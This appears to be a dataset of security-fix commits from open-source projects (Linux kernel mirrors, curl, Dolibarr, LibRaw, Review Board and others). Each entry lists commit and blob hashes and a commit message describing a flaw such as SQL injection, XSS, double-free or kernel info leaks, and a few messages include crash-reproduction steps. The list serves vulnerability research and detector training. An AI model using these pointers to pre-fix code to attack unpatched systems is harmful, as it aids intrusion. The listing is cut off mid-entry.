    caecad9213f5cf14f3ef45827548c77e0648dfb9
    ebde7b6ce687040dda25dbca4802b9daa13e9cfa
    ebff9f4f56ec172875b9c333de12c514b1b719e3
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 929473ea05db455ad88cdc081f2adc556b8dc48f:
usb: chipidea: Allow disabling streaming not only in udc mode\n\nWhen running a scp transfer using a USB/Ethernet adapter the following crash happens:\n\n$ scp test.tar.gz fabio@192.168.1.100:/home/fabio fabio@192.168.1.100's password: test.tar.gz                                      0%    0     0.0KB/s   --:-- ETA ------------[ cut here ]------------ WARNING: at net/sched/sch_generic.c:255 dev_watchdog+0x2cc/0x2f0() NETDEV WATCHDOG: eth0 (asix): transmit queue 0 timed out Modules linked in: Backtrace: [<80011c94>] (dump_backtrace+0x0/0x10c) from [<804d3a5c>] (dump_stack+0x18/0x1c)  r6:000000ff r5:80412388 r4:80685dc0 r3:80696cc0 [<804d3a44>] (dump_stack+0x0/0x1c) from [<80021868>] (warn_slowpath_common+0x54/0x6c) [<80021814>] (warn_slowpath_common+0x0/0x6c) from [<80021924>] (warn_slowpath_fmt+0x38/0x40) ...\n\nSetting SDIS (Stream Disable Mode- bit 4 of USBMODE register) fixes the problem.\n\nHowever, in current code CI13XXX_DISABLE_STREAMING flag is only set in udc mode, so allow disabling streaming also in host mode.\n\nTested on a mx6qsabrelite board.\n\nSuggested-by: Peter Chen <peter.chen@freescale.com> Signed-off-by: Fabio Estevam <fabio.estevam@freescale.com> Reviewed-by: Peter Chen <peter.chen@freescale.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    9427e32e2ed54c1a2bc519a88c057207836df489
File(s) In Commit: 
    htdocs/adherents/fiche.php
Blob(s) In Commit: 
    57aa72e70ca8c6825cfba7beb3cef3b99b21d43a
Blob(s) Before Fix: 
    02e0af3a768b4152edb61598dcc42c792a3d16ce
Projects:
    01viniciusmelo_dolibarr
Commit Message for 9427e32e2ed54c1a2bc519a88c057207836df489:
Fix security breach (SQL injection)

======================================================================
Commit With Fix: 
    8a90598b23e1b2689848187941f7a96b04907005
File(s) In Commit: 
    htdocs/core/lib/functions.lib.php
Blob(s) In Commit: 
    bacda98845d5f700c82e8ad63f25f8f91c45b553
Blob(s) Before Fix: 
    05c6b5641532e0c207c1fe0b08eaa74f0214239e
    71dbfbc1b2b198fbd7e936e38284077909596fa7
Projects:
    01viniciusmelo_dolibarr
Commit Message for 8a90598b23e1b2689848187941f7a96b04907005:
Fix: Escape entities

======================================================================
Commit With Fix: 
    526a80dd202bbca396687a502d52c27e06e97fff
File(s) In Commit: 
    htdocs/core/lib/barcode.lib.php
Blob(s) In Commit: 
    67b51748d3e6801e9d7320978ca9fc2ab00c8a37
Blob(s) Before Fix: 
    151e09077d73521a057c637a9fea37b2a732d11a
    f83ea5f433c31a9a65b694560b3d6a92e6796210
Projects:
    01viniciusmelo_dolibarr
Commit Message for 526a80dd202bbca396687a502d52c27e06e97fff:
Sec: Param not escaped Fix: Bad return error

======================================================================
Commit With Fix: 
    8176cced706b5e5d15887584150764894e94e02f
File(s) In Commit: 
    kernel/events/core.c
Blob(s) In Commit: 
    4d3124b392774322ae1b33f167a10c1046d886d9
Blob(s) Before Fix: 
    59412d037eed2a81163483b89fb38d9feb30623a
    7e0962ed7f8ac850092323e56cbcb73a5a399a13
    b0cd86501c30db1a1320d284f2d52eb1ec499f2b
    d7d71d6ec97278cf60fa5b13e79a80bff27b6af2
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 8176cced706b5e5d15887584150764894e94e02f:
perf: Treat attr.config as u64 in perf_swevent_init()\n\nTrinity discovered that we fail to check all 64 bits of attr.config passed by user space, resulting to out-of-bounds access of the perf_swevent_enabled array in sw_perf_event_destroy().\n\nIntroduced in commit b0a873ebb ("perf: Register PMU implementations").\n\nSigned-off-by: Tommi Rantala <tt.rantala@gmail.com> Cc: Peter Zijlstra <a.p.zijlstra@chello.nl> Cc: davej@redhat.com Cc: Paul Mackerras <paulus@samba.org> Cc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net> Link: http://lkml.kernel.org/r/1365882554-30259-1-git-send-email-tt.rantala@gmail.com Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    fa6a76050d82894365dfe32916903ef7fee3ffcd
File(s) In Commit: 
    src/inspect-fs.c
Blob(s) In Commit: 
    5ca17254ca145bbeb227b752fba0b15d7f2c9bbf
Blob(s) Before Fix: 
    a8dc05cbfd2bea58876646f16fb7d7023927e4e7
Projects:
    AlphaStaxLLC_libguestfs
Commit Message for fa6a76050d82894365dfe32916903ef7fee3ffcd:
inspection: Fix double-free when certain guest files are empty.\n\nThe following commit:\n\n  commit 5a3da366268825b26b470cde35658b67c1d11cd4   Author: Richard W.M. Jones <rjones@redhat.com>   Date:   Thu Jan 24 17:07:38 2013 +0000\n\n      inspect: Use CLEANUP_* macros in inspection code.\n\ncan cause a double-free along an error path when certain guest files are empty where we expected those files to contain at least one line.\n\nThis causes virt-inspector to crash when run on these guests.\n\nThe following is a test case which demonstrates the crash. `f20rawhidex64' is a Fedora guest, but with small adjustments to the test you could use any Linux guest for this test.\n\n  $ qemu-img create -f qcow2 -b f20rawhidex64 /tmp/test.qcow2   Formatting '/tmp/test.qcow2', fmt=qcow2 size=21474836480 backing_file='f20rawhidex64' encryption=off cluster_size=65536 lazy_refcounts=off   $ guestfish -i -a /tmp/test.qcow2 -- rm /etc/redhat-release : touch /etc/redhat-release   $ virt-inspector /tmp/test.qcow2   *** glibc detected *** virt-inspector: double free or corruption (fasttop): 0x00007f18bc9925a0 ***   ======= Backtrace: =========   /lib64/libc.so.6(+0x34ecc7ca8e)[0x7f18b8e64a8e]   /lib64/libguestfs.so.0(+0x3f91898078)[0x7f18ba13c078]   /lib64/libguestfs.so.0(+0x3f91899761)[0x7f18ba13d761]   /lib64/libguestfs.so.0(+0x3f91896d12)[0x7f18ba13ad12]   /lib64/libguestfs.so.0(+0x3f91894140)[0x7f18ba138140]   /lib64/libguestfs.so.0(guestfs_inspect_os+0x35)[0x7f18ba0bcc35]   virt-inspector(main+0x547)[0x7f18ba7c57d7]   /lib64/libc.so.6(__libc_start_main+0xf5)[0x7f18b8e09a05]   virt-inspector(+0x6665)[0x7f18ba7c7665]\n\nThis is a denial of service, but not likely to be exploitable.\n\n(Found by Coverity)

======================================================================
Commit With Fix: 
    19ffddb0fe1a4ffdb459b797ffcf7f490d28b5a6
File(s) In Commit: 
    src/libraw_cxx.cpp
Blob(s) In Commit: 
    f45521b2a682fc893815ad62f63b441b39215d74
Blob(s) Before Fix: 
    e36c11a5b742055bb2bae583649f6302427cbfab
Projects:
    AlexeyKruglov_LibRaw
Commit Message for 19ffddb0fe1a4ffdb459b797ffcf7f490d28b5a6:
prevent double-free() on broken full-color images error handling

======================================================================
Commit With Fix: 
    2f912f5b33582961b1cdbd9fd828589f8b78f21d
File(s) In Commit: 
    src/libraw_cxx.cpp
Blob(s) In Commit: 
    e36c11a5b742055bb2bae583649f6302427cbfab
Blob(s) Before Fix: 
    7acc07623446b7fcc026d5a11b5137b3cb359b57
Projects:
    AlexeyKruglov_LibRaw
Commit Message for 2f912f5b33582961b1cdbd9fd828589f8b78f21d:
fixed wrong data_maximum calcluation  prevent out-of-buffer in exp_bef

======================================================================
Commit With Fix: 
    baff42ab1494528907bf4d5870359e31711746ae
File(s) In Commit: 
    net/ipv4/tcp.c
Blob(s) In Commit: 
    2c75f891914e83ee5ed3f99c51aa84f5de7e9c9b
Blob(s) Before Fix: 
    5901010fad55bc969fe509ae8d3fde0aef443b2d
    6afb6d8662b2cebb984bec82657ab4221e95e464
    98440ad82558064ce4eb7ee9ad525f9725413739
    b0a26bb25e2e3b341b2aad2e5f911fd99f6833fe
    fafbec8b073e025bb987ce1bcf6f56f450aec9db
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for baff42ab1494528907bf4d5870359e31711746ae:
net: Fix oops from tcp_collapse() when using splice()\n\ntcp_read_sock() can have a eat skbs without immediately advancing copied_seq. This can cause a panic in tcp_collapse() if it is called as a result of the recv_actor dropping the socket lock.\n\nA userspace program that splices data from a socket to either another socket or to a file can trigger this bug.\n\nSigned-off-by: Steven J. Magnani <steve@digidescorp.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    2bd410ee5570cea127233f1133ea22f25174eb28
File(s) In Commit: 
    modules/webadmin.cpp
Blob(s) In Commit: 
    4f42d58b7f4bcc3ae0dcbb37839a542179a9e2d0
Blob(s) Before Fix: 
    8784574b68965ddfd87530c843a4e329e3746497
Projects:
    126carpower_znc
Commit Message for 2bd410ee5570cea127233f1133ea22f25174eb28:
Fix NULL pointer dereference in webadmin.\n\nTriggerable by any non-admin, if webadmin is loaded.\n\nThe only affected version is 1.0\n\nThanks to ChauffeR (Simone Esposito) for reporting this.

======================================================================
Commit With Fix: 
    604c499cbbcc3d5fe5fb8d53306aa0fae1990109
File(s) In Commit: 
    drivers/block/xen-blkback/blkback.c
Blob(s) In Commit: 
    4119bcdefd1affc8a8ea2dd928a45dd128b36828
Blob(s) Before Fix: 
    e79ab45592332082662d3693b91cfd6def90493d
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 604c499cbbcc3d5fe5fb8d53306aa0fae1990109:
xen/blkback: Check device permissions before allowing OP_DISCARD\n\nWe need to make sure that the device is not RO or that the request is not past the number of sectors we want to issue the DISCARD operation for.\n\nThis fixes CVE-2013-2140.\n\nCc: stable@vger.kernel.org Acked-by: Jan Beulich <JBeulich@suse.com> Acked-by: Ian Campbell <Ian.Campbell@citrix.com> [v1: Made it pr_warn instead of pr_debug] Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>

======================================================================
Commit With Fix: 
    b9e146d8eb3b9ecae5086d373b50fa0c1f3e7f0f
File(s) In Commit: 
    kernel/signal.c
Blob(s) In Commit: 
    598dc06be4214c7a11fbf128baff984fa9c1c4b5
Blob(s) Before Fix: 
    0af8868525d6d1853acfa77eb9f224566ccfb313
    2ec870a4c3c4faa2a6c30c0ee380d9fc9bd25de5
    3d09cf6cde756671655c96f2f81a43438eb62b7e
    50e425cbc8874a01621d2f8fef3c5b4e252885e6
    56ce3a618b289e1f16fddeba393c62b76fdd0e5d
    677102789cf22d4847936782f6c6f67085421927
    95174894f643449e038f196e7e4575e5920437b5
    aacebb2e4f5eb5107c76c6acb1595be1da120d49
    be4f856d52f81bab8184544b5dd6dd9b823bc21b
    c2e90b31fb5d9eb1ae009f3d654c2bd605bb35e8
    dd72567767d963ccb8ac2f3cfa4a824fa5f81b4e
    dec9c305aec440622418abc4bc638c5f8d2eab0c
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b9e146d8eb3b9ecae5086d373b50fa0c1f3e7f0f:
kernel/signal.c: stop info leak via the tkill and the tgkill syscalls\n\nThis fixes a kernel memory contents leak via the tkill and tgkill syscalls for compat processes.\n\nThis is visible in the siginfo_t->_sifields._rt.si_sigval.sival_ptr field when handling signals delivered from tkill.\n\nThe place of the infoleak:\n\nint copy_siginfo_to_user32(compat_siginfo_t __user *to, siginfo_t *from) {         ...         put_user_ex(ptr_to_compat(from->si_ptr), &to->si_ptr)          ... }\n\nSigned-off-by: Emese Revfy <re.emese@gmail.com> Reviewed-by: PaX Team <pageexec@freemail.hu> Signed-off-by: Kees Cook <keescook@chromium.org> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: Oleg Nesterov <oleg@redhat.com> Cc: "Eric W. Biederman" <ebiederm@xmission.com> Cc: Serge Hallyn <serge.hallyn@canonical.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    f1923820c447e986a9da0fc6bf60c1dccdf0408e
File(s) In Commit: 
    arch/x86/kernel/cpu/perf_event_intel.c
Blob(s) In Commit: 
    cc45deb791b01d103c01cbc527f8bfd023d51879
Blob(s) Before Fix: 
    187c294bc6583424e8613df62a883740ab8fca1a
    26b3e2fef1047a86a7d546d4b7e8326b3ecbad33
    4914e94ad6e86a9565420dcac8d014ff679ab6fa
    529c8931fc029faffb4f4437ef74dd4fedb538f3
    6bca492b85475bc8eab5577447ce1fa9a5133223
    70602f81f052042195475f44f58978e6893b518c
    dab7580c47aee2e71e501afbfa94c17e2790777d
    e18f13d9ce936d02a35b59b02d77f9a9156726db
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for f1923820c447e986a9da0fc6bf60c1dccdf0408e:
perf/x86: Fix offcore_rsp valid mask for SNB/IVB\n\nThe valid mask for both offcore_response_0 and offcore_response_1 was wrong for SNB/SNB-EP, IVB/IVB-EP. It was possible to write to reserved bit and cause a GP fault crashing the kernel.\n\nThis patch fixes the problem by correctly marking the reserved bits in the valid mask for all the processors mentioned above.\n\nA distinction between desktop and server parts is introduced because bits 24-30 are only available on the server parts.\n\nThis version of the  patch is just a rebase to perf/urgent tree and should apply to older kernels as well.\n\nSigned-off-by: Stephane Eranian <eranian@google.com> Cc: peterz@infradead.org Cc: jolsa@redhat.com Cc: gregkh@linuxfoundation.org Cc: security@kernel.org Cc: ak@linux.intel.com Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    192c4f788d48f82c03e9cef40013f34370e90737
File(s) In Commit: 
    lib/escape.c
Blob(s) In Commit: 
    aa7db2c5b99d94287b4bac94c0b9be0ede22a2db
Blob(s) Before Fix: 
    0dd5a1d0a687194492b2c38b54007de3e0775530
    24abb930be1b4a5bc06f40b562208f194bbd7db4
    5500a92bfacbb18017acb6ef0f6a9435994b9446
    6a26cf8ef9ff0515c07cce92a63e16da66383c83
    735e1d8a7f50b25e6132d40f86de61f74407bf2b
    b0922bc936840aa45d6ef87f5920e978c716436b
    b5a27b8d2f45bf86c94170585cc459d31d26e8df
    ee30b286b06aa703d7fd3a5970e02d07214d3871
Projects:
    0ca_curl
Commit Message for 192c4f788d48f82c03e9cef40013f34370e90737:
Curl_urldecode: no peeking beyond end of input buffer\n\nSecurity problem: CVE-2013-2174\n\nIf a program would give a string like "%FF" to curl_easy_unescape() but ask for it to decode only the first byte, it would still parse and decode the full hex sequence. The function then not only read beyond the allowed buffer but it would also deduct the *unsigned* counter variable for how many more bytes there's left to read in the buffer by two, making the counter wrap. Continuing this, the function would go on reading beyond the buffer and soon writing beyond the allocated target buffer...\n\nBug: http://curl.haxx.se/docs/adv_20130622.html Reported-by: Timo Sirainen

======================================================================
Commit With Fix: 
    15f72c1ee5e0afad20232bdf0fcecab8d62a5d89
File(s) In Commit: 
    plugins/mandril/mandril.c
Blob(s) In Commit: 
    820f4416d769860a11599c2ded44762ec729d7ff
Blob(s) Before Fix: 
    6c32825bc19bcaba17c24917d264520eb37bb887
    8df087b3ccd749d3c528d4a436b548d8f3c5c7b5
Projects:
    AmesianX_monkey
Commit Message for 15f72c1ee5e0afad20232bdf0fcecab8d62a5d89:
Mandril: check decoded URI (fix #92)\n\nSigned-off-by: Eduardo Silva <eduardo@monkey.io>

======================================================================
Commit With Fix: 
    b61ac518ffa2657e2dc9019b2dcf2f3f37dbfab0
File(s) In Commit: 
    src/moxieplayer.as
Blob(s) In Commit: 
    c626b77433ea8c944a62a616d1f277eb72968987
Blob(s) Before Fix: 
    1c769ac905d7acd9b2d5a4420500e1d671f94455
Projects:
    wix-pl_moxieplayer
Commit Message for b61ac518ffa2657e2dc9019b2dcf2f3f37dbfab0:
Consider part of url after '?' as querystring, no matter what preceeds it.\n\nFlash doesn't recognize '#' symbol as the beginning of the fragment to ignore, so if '?' mark follows, remaining part of the url will still be interpreted as application parameters… wtf?

======================================================================
Commit With Fix: 
    f2815633504b442ca0b0605c16bf3d88a3a0fcea
File(s) In Commit: 
    net/sctp/sm_statefuns.c
Blob(s) In Commit: 
    de1a0138317f482c028ce583c335501b14d9f917
Blob(s) Before Fix: 
    01e002430c858c293cdda11bd2962c3340043fb9
    1be95a2d5bf93cf4179d6382ea6d2be220e266cd
    246117142b5c9eae0b7d4b472b630382d91f2e00
    24b2cd55563726e8cd24be5dfbfafe8eb2892886
    3bd5388bd85ab37170ddd2334b8e2e9bc04ef3b6
    3ee27b7704ffb95430541507e83973e9207f9672
    4da6afdcc8d6d2da820f605f2ecf5b67a1d7acd8
    5131fcfedb03c0b09e8c7e451341cebd82e49692
    618ec7e216cae9bb17038c07ff5d87a75c8f6208
    6eb26403de6a7d9b9b0103ed8fc58a9534dfec04
    7ceb25ba85b82f3a846e455bb0d3fb78e7741733
    891f5db8cc31c25f8a9412b6c8bb6dfdc114552f
    9973079401c4e12181ef06ffa6bddf455939d39e
    9fca103573508aa6f0880455e0e2c2d66dbb6150
    a26065be728901ed3c7e35690bafc51deabab115
    b6adef8a1e938d22b5cab026597e6f82c917794d
    c52763a2629719d38afa624f85cd83756d51969f
    cb1c4303a07a5bf37c28f9d7c3bab646261a4f0a
    d9cbecb62aca895d32a674bf95a64b7519d1d2e3
    df938b2ab8480ca907f55dc68f13533389ea3851
    ebcd1eedb1151d050d51c5a5043e720f4797a33a
    edc204b05c825b1b8a97f0d37c049a1b5d75c008
    f02ce3dddb7b0ca622e7244717621e2d59a0de25
    f17b1cb4e39b26cd83c752ffb79c6e28bd58aef7
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for f2815633504b442ca0b0605c16bf3d88a3a0fcea:
sctp: Use correct sideffect command in duplicate cookie handling\n\nWhen SCTP is done processing a duplicate cookie chunk, it tries to delete a newly created association.  For that, it has to set the right association for the side-effect processing to work. However, when it uses the SCTP_CMD_NEW_ASOC command, that performs more work then really needed (like hashing the associationa and assigning it an id) and there is no point to do that only to delete the association as a next step.  In fact, it also creates an impossible condition where an association may be found by the getsockopt() call, and that association is empty.  This causes a crash in some sctp getsockopts.\n\nThe solution is rather simple.  We simply use SCTP_CMD_SET_ASOC command that doesn't have all the overhead and does exactly what we need.\n\nReported-by: Karl Heiss <kheiss@gmail.com> Tested-by: Karl Heiss <kheiss@gmail.com> CC: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: Vlad Yasevich <vyasevich@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4aaacbb1e628a80803ba1a55703db38fccdf7dbf
File(s) In Commit: 
    reviewboard/htdocs/media/rb/js/reviews.js
Blob(s) In Commit: 
    035872ff94ce71e3970db30b563e042268ec497c
Blob(s) Before Fix: 
    6340744d435dabd222cfc1abf440b196a0f4bede
Projects:
    1tush_reviewboard
Commit Message for 4aaacbb1e628a80803ba1a55703db38fccdf7dbf:
Fix an XSS vulnerability in the reviews dropdown.\n\nThe reviews dropdown had a bad vulnerability where it would assume the user's full name is valid HTML. This allowed the user to craft a script tag that would be executed every time the name appeared in the dropdown.\n\nThis vulnerability exists in 1.6.x, 1.7.x, and the in-development 1.8. There are no known attacks in the wild.\n\nThis was reported by Craig Young at Tripwire.

======================================================================
Commit With Fix: 
    a963a37d384d71ad43b3e9e79d68d42fbe0901f3
File(s) In Commit: 
    net/ipv6/ip6_output.c
Blob(s) In Commit: 
    d5d20cde8d92808387e171fb25b2fa701a06f275
Blob(s) Before Fix: 
    0c7c03d50dc0342c7caad25c9d24c3931c50438b
    0fe5154dd497fb290d0d1fd86a088d304c15778d
    155eccfa77604fcd63bbeeff1db23ed184082dd6
    1ce7ea1f40b77b8ccad37df3e291508279460b93
    3a65b9a9cb4d3691a680bd2055cfc513944102f0
    49b835ebb854c7a5439c41ef592e8076b6620244
    5b2d63ed793e1ffe7a568e9c581ccf7bab9057a5
    64d6073731d368e54073f9ca97ac6ad0cecdd415
    851fdae2d78d4b3a88195d720cae32dcc2296099
    95703ba2c084de31c8de3c41d830bb789f2f416e
    9d4d1fd412e834c82bde218de259a212ae78da5b
    aece3e792f84ad4cfcc88ada01817c70242b396d
    b7ca46161cb9b587d02c056f3236ae5725bf21f5
    ce661baa60cbf943f82868df96e6692b513fc86e
    d2eedf192330caf5a963c27ddaceffae5e4886b8
    dae1949019d7b8dc77d14c39478571e86ad89f34
    ffa8d295c56c8294a42cdc090c1903c59646c47b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a963a37d384d71ad43b3e9e79d68d42fbe0901f3:
ipv6: ip6_sk_dst_check() must not assume ipv6 dst\n\nIt's possible to use AF_INET6 sockets and to connect to an IPv4 destination. After this, socket dst cache is a pointer to a rtable, not rt6_info.\n\nip6_sk_dst_check() should check the socket dst cache is IPv6, or else various corruptions/crashes can happen.\n\nDave Jones can reproduce immediate crash with trinity -q -l off -n -c sendmsg -c connect\n\nWith help from Hannes Frederic Sowa\n\nReported-by: Dave Jones <davej@redhat.com> Reported-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: Eric Dumazet <edumazet@google.com> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a5cc68f3d63306d0d288f31edfc2ae6ef8ecd887
File(s) In Commit: 
    net/key/af_key.c
Blob(s) In Commit: 
    9da862070dd84fe596f77582c82af6eec8ad660c
Blob(s) Before Fix: 
    020a6020cadd159383120433d8caaf83964dd199
    08897a3c7ec764550d518777811fa8e3179a9492
    34e418508a675d1f3427fa09f73ef43f2c9adae7
    556fdafdd1ea3fb6d85b44c2e3efeb600b1839b8
    5b1e5af257137e4c6a03a2c575f1adb5a949e25e
    5b426a6465447f954a4b4728f72a6c00966c91ee
    66f51c5a8a3aca0e10ffb89e10b8f3e15df6370b
    79326978517a6842b8538b6a45b95309b8e37d4f
    7e5d927b576f79b8163b765ff5dcb6f6e0c4be43
    8555f331ea60d4bca67cbe91390ed077f62a091e
    911ef03bf8fbf1716672fb503f39de7fe13746d9
    ab8bd2cabfa090a4fa50524e7a76064891e535d6
    bbb634c3e7d5ed65a86fbc597a60712a90aa2afd
    c5fbd7589681cf984220325fff463696163340d0
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a5cc68f3d63306d0d288f31edfc2ae6ef8ecd887:
af_key: fix info leaks in notify messages\n\nkey_notify_sa_flush() and key_notify_policy_flush() miss to initialize the sadb_msg_reserved member of the broadcasted message and thereby leak 2 bytes of heap memory to listeners. Fix that.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Cc: Steffen Klassert <steffen.klassert@secunet.com> Cc: "David S. Miller" <davem@davemloft.net> Cc: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    85dfb745ee40232876663ae206cba35f24ab2a40
File(s) In Commit: 
    net/key/af_key.c
Blob(s) In Commit: 
    d5a4a796f0250ac1d48f6d116eec6b4f9a81f339
Blob(s) Before Fix: 
    08897a3c7ec764550d518777811fa8e3179a9492
    34e418508a675d1f3427fa09f73ef43f2c9adae7
    5b426a6465447f954a4b4728f72a6c00966c91ee
    7e5d927b576f79b8163b765ff5dcb6f6e0c4be43
    9ef79851f297999bbd584ba33a539944425cd02e
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 85dfb745ee40232876663ae206cba35f24ab2a40:
af_key: initialize satype in key_notify_policy_flush()\n\nThis field was left uninitialized. Some user daemons perform check against this field.\n\nSigned-off-by: Nicolas Dichtel <nicolas.dichtel@6wind.com> Signed-off-by: Steffen Klassert <steffen.klassert@secunet.com>

======================================================================
Commit With Fix: 
    c5318bb1a2dd266b50317a2adb74d74338593733
File(s) In Commit: 
    lib/flowplayer.swf.php
Blob(s) In Commit: 
    58bcd2019430f9a4a1c7cd5f732bf90e2b3866a0
Blob(s) Before Fix: 
    121675ad9189b667bbfaaf665ae64f8b01e4697c
Projects:
    12aZeR_gallery3
Commit Message for c5318bb1a2dd266b50317a2adb74d74338593733:
Strip off the fragment as well as any query parameters.  Fixes #2073.

======================================================================
Commit With Fix: 
    cbbcf1b4791762d7da0ea7b6c4f4b551a4d9caed
File(s) In Commit: 
    modules/gallery/helpers/data_rest.php
Blob(s) In Commit: 
    a0a225f990d2b5ed7095ea9ffbc783335a77a5de
Blob(s) Before Fix: 
    343975f6af26ef33bb98074162f0080b04419769
    791de9c0dc5a7d35023ecbaa2164bafc82a50362
    d4f456d760263331dcbe0b73182ab71981093d5c
Projects:
    12aZeR_gallery3
Commit Message for cbbcf1b4791762d7da0ea7b6c4f4b551a4d9caed:
#2074 - Mirror some additional file_proxy checks in data_rest.\n\n--HG-- extra : source : 752417004a5c988b09f1312c4e96f10dd11594b9

======================================================================
Commit With Fix: 
    6c8aa4e9c810994f7632837487426867ce50f468
File(s) In Commit: 
    symphony/lib/toolkit/class.authormanager.php
Blob(s) In Commit: 
    d07df76c29b12b2ef0f35ffdbe4b0409a3db5bbb
Blob(s) Before Fix: 
    0b15b45341f8d57b31736c1e605b78446932293d
    2b0c2f029f8e28dca3a3acb188828d213635c778
    37a8e6c4d7101f40cb9daecd99ef085d4923887f
    7d3889a35b6b957c6018e2883003188200b42aa1
Projects:
    1900_symphony-2
Commit Message for 6c8aa4e9c810994f7632837487426867ce50f468:
Fix potential autheticated SQL injection attack on the Authors page

======================================================================
Commit With Fix: 
    29cd8ae0e1a39e239a3a7b67da1986add1199fc0
File(s) In Commit: 
    net/dcb/dcbnl.c
Blob(s) In Commit: 
    21291f1abcd6d0d228241b6771984d704bc1699e
Blob(s) Before Fix: 
    19ac2b985485f0e7ef4b408197ffb10434143c78
    1b588e23cf80b561632b9b5e16b851dff218a933
    3609eacaf4cedd332cf11e50a7af5096cc45bc26
    656c7c75b192780fdc1c5febdf9f21a9c90491e6
    70989e672304938a39cdf7b7a0dfd87b7497d2a9
    81f2bb62dea3a7fdd569636fa8649350eb264a35
    d42f2b3d0138cce3a4477fe117f9e1579e612df0
    d86053002c16b896fdea34bd174b37e6c4aa3054
    d8f262fa7120cdd451c3e528819e9985fd65aa0f
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 29cd8ae0e1a39e239a3a7b67da1986add1199fc0:
dcbnl: fix various netlink info leaks\n\nThe dcb netlink interface leaks stack memory in various places: * perm_addr[] buffer is only filled at max with 12 of the 32 bytes but   copied completely, * no in-kernel driver fills all fields of an IEEE 802.1Qaz subcommand,   so we're leaking up to 58 bytes for ieee_ets structs, up to 136 bytes   for ieee_pfc structs, etc., * the same is true for CEE -- no in-kernel driver fills the whole   struct,\n\nPrevent all of the above stack info leaks by properly initializing the buffers/structures involved.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    84d73cd3fb142bf1298a8c13fd4ca50fd2432372
File(s) In Commit: 
    net/core/rtnetlink.c
Blob(s) In Commit: 
    a585d45cc9d9faefbc51fde485971a1336065e58
Blob(s) Before Fix: 
    1868625af25e096d1c7886d29ce6c5967ac1040f
    76d4c2c3c89b9d170e89c39fbf0ed5729621a0bc
    b376410ff2590f3e10897488fd6c092df70faa4c
    d8aa20f6a46e5fa7ffea786336c06f077f8eb2b6
    fad649ae4decbf393c52b614dc8be0aef07e0750
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 84d73cd3fb142bf1298a8c13fd4ca50fd2432372:
rtnl: fix info leak on RTM_GETLINK request for VF devices\n\nInitialize the mac address buffer with 0 as the driver specific function will probably not fill the whole buffer. In fact, all in-kernel drivers fill only ETH_ALEN of the MAX_ADDR_LEN bytes, i.e. 6 of the 32 possible bytes. Therefore we currently leak 26 bytes of stack memory to userland via the netlink interface.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c085c49920b2f900ba716b4ca1c1a55ece9872cc
File(s) In Commit: 
    net/bridge/br_mdb.c
Blob(s) In Commit: 
    ee79f3f20383c9112ff2685ef10b6d69a1d40c97
Blob(s) Before Fix: 
    2897e40edde46e1fdef5e840f9e00a6bf460ef14
    38991e03646de3d5bbd142ef2bdebcd3175003e4
    6f0a2eebcb27fe3b04fc077dbab320985998b008
    9f97b850fc65171cf87692cf87a3b2e29d906e0c
    acc9f4cc18f77a3598b2190e2f38f3acb8a03e36
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c085c49920b2f900ba716b4ca1c1a55ece9872cc:
bridge: fix mdb info leaks\n\nThe bridging code discloses heap and stack bytes via the RTM_GETMDB netlink interface and via the notify messages send to group RTNLGRP_MDB afer a successful add/del.\n\nFix both cases by initializing all unset members/padding bytes with memset(0).\n\nCc: Stephen Hemminger <stephen@networkplumber.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    3e88c98ca513880e2b43ed7f27ade17fef5d9170
File(s) In Commit: 
    security/MemberLoginForm.php
Blob(s) In Commit: 
    cb584539cc2465d0bfe583261851c5d314efd6c7
Blob(s) Before Fix: 
    1e5e2bceb982b24c435b64b44901cdbfeebcda40
    755006efc95127afcfd843717aa3b89be7114522
Projects:
    12345678--_silverstripe-framework
Commit Message for 3e88c98ca513880e2b43ed7f27ade17fef5d9170:
API Restrict MemberLoginForm to POST requests for increased security\n\nCVE-2013-2653 - Thanks to Fara Rustein of Deloitte Argentina for reporting.

======================================================================
Commit With Fix: 
    12ae030d54ef250706da5642fc7697cc60ad0df7
File(s) In Commit: 
    kernel/trace/trace_event_perf.c
Blob(s) In Commit: 
